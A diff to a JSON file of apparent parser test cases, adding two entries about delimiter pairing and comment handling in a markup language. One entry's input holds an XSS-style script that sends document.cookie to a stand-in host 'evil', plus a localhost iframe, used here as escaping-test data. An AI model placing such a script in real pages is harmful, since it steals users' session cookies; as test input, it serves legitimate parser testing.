@@ -2290,6 +2290,26 @@
       "meaning02": "C2-B-082 and C2-B-109 read the footnote definition at document scope after the explicit div closer.",
       "toolEntry": "U-253",
       "silent": true
+    },
+    {
+      "id": "U-254",
+      "kind": "report",
+      "group": "inline delimiter and comment ownership changes",
+      "from": "/{+a/{k=b+}\n or /x /*a %% b*/{.c} y\n",
+      "to": "",
+      "meaning02": "C2-I-023, C2-I-043, and C2-I-047 change delimiter pairing when an attribute opener or a line comment intervenes.",
+      "toolEntry": "U-254",
+      "silent": true
+    },
+    {
+      "id": "U-255",
+      "kind": "report",
+      "group": "slash delimiters pair across escaped HTML tags",
+      "from": "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n",
+      "to": "",
+      "meaning02": "C2-I-047 pairs slash delimiters at a different boundary after raw HTML is escaped.",
+      "toolEntry": "U-255",
+      "silent": true
     }
   ],
   "tree": [
